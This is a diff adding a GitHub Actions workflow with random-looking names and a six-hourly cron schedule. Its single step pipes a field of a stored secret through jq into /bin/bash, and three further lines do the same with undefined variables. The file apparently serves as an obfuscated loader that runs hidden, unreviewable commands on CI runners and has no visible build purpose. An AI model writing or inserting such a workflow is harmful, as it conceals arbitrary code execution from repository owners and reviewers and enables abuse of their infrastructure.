@@ -1,0 +1,20 @@
+name: pennysingleton119
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: pennysingleton119
+        env:
+          lbvph9519: ${{ secrets.lbvph9519 }}
+        run: |
+          echo $lbvph9519 | jq -r .fu41 | /bin/bash
+          echo $nij399 | jq -r .fuut6 | /bin/bash
+          echo $ujjxb077 | jq -r .aomc75911 | /bin/bash
+          echo $vf938 | jq -r .eu579 | /bin/bash
+
